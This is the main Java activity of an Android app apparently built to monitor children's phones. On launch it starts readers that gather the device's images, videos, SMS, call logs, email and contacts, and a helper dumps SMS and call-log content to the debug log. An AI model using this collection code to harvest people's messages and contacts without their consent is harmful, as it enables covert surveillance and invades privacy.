package com.thangld.managechildren.main;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import com.thangld.managechildren.R;
import com.thangld.managechildren.collection.reader.CallLogReader;
import com.thangld.managechildren.collection.reader.ContactReader;
import com.thangld.managechildren.collection.reader.EmailReader;
import com.thangld.managechildren.collection.reader.ImageReader;
import com.thangld.managechildren.collection.reader.PhoneReader;
import com.thangld.managechildren.collection.reader.SmsReader;
import com.thangld.managechildren.collection.reader.VideoReader;
import com.thangld.managechildren.database.DatabaseHelper;

import static com.thangld.managechildren.Constant.MY_TAG;

public class MainActivity extends AppCompatActivity {


    DatabaseHelper mDbHelper;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        ImageReader imageReader = new ImageReader(this);
        imageReader.execute();

        VideoReader videoReader = new VideoReader(this);
        videoReader.execute();

        SmsReader smsReader = new SmsReader(this);
        smsReader.execute();

        PhoneReader phoneReader = new PhoneReader(this);
        phoneReader.execute();

        EmailReader emailReader = new EmailReader(this);
        emailReader.execute();

        CallLogReader callLogReader = new CallLogReader(this);
        callLogReader.execute();

        ContactReader contactReader = new ContactReader(this);
        contactReader.execute();



//        logSms("conversations",Uri.parse("content://call_log/calls"));

//        logSms("inbox", Uri.parse("content://sms/inbox"));
//        logSms("sent", Uri.parse("content://sms/sent"));
//
//        logSms("contact", ContactsContract.Contacts.CONTENT_URI);
//        logSms("phone", ContactsContract.CommonDataKinds.Phone.CONTENT_URI);
//
//
//        ContentResolver cr = getContentResolver();
//        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
//                null, null, null, null);
//
//        if (cur.getCount() > 0) {
//            while (cur.moveToNext()) {
//                String id = cur.getString(
//                        cur.getColumnIndex(ContactsContract.Contacts._ID));
//                String name = cur.getString(cur.getColumnIndex(
//                        ContactsContract.Contacts.DISPLAY_NAME));
//
//                if (cur.getInt(cur.getColumnIndex(
//                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
//                    Cursor pCur = cr.query(
//                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
//                            null,
//                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
//                            new String[]{id}, null);
//                    while (pCur.moveToNext()) {
//                        String phoneNo = pCur.getString(pCur.getColumnIndex(
//                                ContactsContract.CommonDataKinds.Phone.NUMBER));
//
//                        Log.d("ContactReader", "Name: " + name
//                                + ", Phone No: " + phoneNo);
//                    }
//                    pCur.close();
//                }
//            }
//        }


    }

    public void logSms(String tag,Uri uri){
        Log.d(MY_TAG, "\n\n\n");

        ContentResolver cr = this.getContentResolver();
        Cursor cursor = cr.query(uri, null, null, null, null);
//        Cursor c = managedQuery(allCalls, null, null, null, null);

        if(cursor.moveToFirst()){
            do {
                String msgData = "";
                for(int idx=0;idx<cursor.getColumnCount();idx++)
                {
                    msgData += " " + cursor.getColumnName(idx) + ":" + cursor.getString(idx);
                }
                Log.d(tag, msgData);
                // use msgData
            } while (cursor.moveToNext());

        }



        cursor.close();

    }
}
